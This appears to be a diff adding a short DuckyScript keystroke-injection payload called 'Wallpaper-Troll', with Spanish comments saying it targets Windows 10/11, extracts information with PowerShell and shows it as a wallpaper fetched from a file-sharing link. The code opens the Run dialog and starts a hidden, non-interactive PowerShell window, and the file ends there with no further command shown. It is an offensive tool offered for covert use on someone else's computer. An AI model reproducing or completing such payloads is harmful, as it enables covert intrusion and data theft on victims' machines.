@@ -1,0 +1,19 @@
+REM     Title: Wallpaper-Troll
+REM
+REM     Author: Ian P
+REM
+REM     Descripción: Ejecuta un Wallpaper en donde se ha almacenado información extraída con el PowerShell
+REM
+REM     Objetivo: Windows 10, 11
+REM
+REM     
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+REM
+REM     
+REM     
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI 
+DELAY 500
+ENTER
